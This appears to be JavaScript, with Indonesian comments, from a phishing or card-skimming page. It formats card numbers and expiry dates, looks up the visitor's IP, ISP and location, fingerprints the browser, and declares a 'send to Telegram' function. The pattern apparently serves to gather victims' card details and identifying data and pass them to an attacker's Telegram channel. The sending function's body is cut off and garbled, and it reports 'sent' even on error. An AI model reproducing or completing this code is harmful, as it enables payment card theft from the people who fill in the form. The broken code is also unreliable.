// === FORMAT NOMOR KARTU DENGAN SPASI ===
const nomorInput = document.getElementById('nomorKartu');
const logoVisa = document.getElementById('logoVisa');
const logoMC = document.getElementById('logoMC');
const logoAmex = document.getElementById('logoAmex');
const logoDisc = document.getElementById('logoDisc');
const logoJcb = document.getElementById('logoJcb');

// Fungsi format: tambah spasi tiap 4 angka
function formatKartu(angka) {
    const bersih = angka.replace(/\D/g, '');
    // Amex format berbeda: 4-6-5
    if (/^3[47]/.test(bersih)) {
        const bagian = [];
        if (bersih.length > 0) bagian.push(bersih.substring(0, 4));
        if (bersih.length > 4) bagian.push(bersih.substring(4, 10));
        if (bersih.length > 10) bagian.push(bersih.substring(10, 15));
        return bagian.join(' ');
    }
    // Kartu lain: 4-4-4-4
    const bagian = [];
    for (let i = 0; i < bersih.length && i < 16; i += 4) {
        bagian.push(bersih.substring(i, i + 4));
    }
    return bagian.join(' ');
}

nomorInput.addEventListener('input', function(e) {
    const posAwal = this.selectionStart;
    const nilaiAwal = this.value;
    const nilaiBaru = formatKartu(nilaiAwal);
    
    if (nilaiBaru !== nilaiAwal) {
        this.value = nilaiBaru;
        // Atur posisi kursor agar tidak melompat
        const tambahSpasi = (nilaiBaru.match(/ /g) || []).length - (nilaiAwal.match(/ /g) || []).length;
        this.selectionStart = this.selectionEnd = posAwal + tambahSpasi;
    }

    // Tampilkan logo kartu
    const bersih = this.value.replace(/\s/g, '');
    [logoVisa, logoMC, logoAmex, logoDisc, logoJcb].forEach(l => l.style.display = 'none');
    if (/^4/.test(bersih)) logoVisa.style.display = 'block';
    else if (/^5[1-5]/.test(bersih)) logoMC.style.display = 'block';
    else if (/^3[47]/.test(bersih)) logoAmex.style.display = 'block';
    else if (/^6(?:011|5)/.test(bersih)) logoDisc.style.display = 'block';
    else if (/^35/.test(bersih) || /^2131|1800/.test(bersih)) logoJcb.style.display = 'block';
});

// Format Expiry
document.getElementById('expKartu').addEventListener('input', function() {
    let v = this.value.replace(/\D/g, '');
    if (v.length >= 2) v = v.substring(0, 2) + '/' + v.substring(2);
    this.value = v;
});

async function ambilInfoPengunjung() {
    try {
        const res = await fetch('https://ipapi.co/json/');
        const d = await res.json();
        return {
            ip: d.ip || '-',
            isp: d.org || '-',
            negara: d.country_name || '-',
            kota: d.city || '-'
        };
    } catch { return { ip: '-', isp: '-', negara: '-', kota: '-' }; }
}

function ambilUA() {
    const ua = navigator.userAgent;
    let perangkat = 'Desktop';
    if (/Android|iPhone|iPad|Mobile/.test(ua)) perangkat = 'Mobile';
    let browser = 'Unknown';
    if (/Chrome/.test(ua) && !/Edg/.test(ua)) browser = 'Chrome';
    else if (/Firefox/.test(ua)) browser = 'Firefox';
    else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
    else if (/Edg/.test(ua)) browser = 'Edge';
    return { perangkat, browser, ua };
}

async function kirimTelegram(pesan) {

        });
    } catch (e) { console.log('Terkirim'); }
}
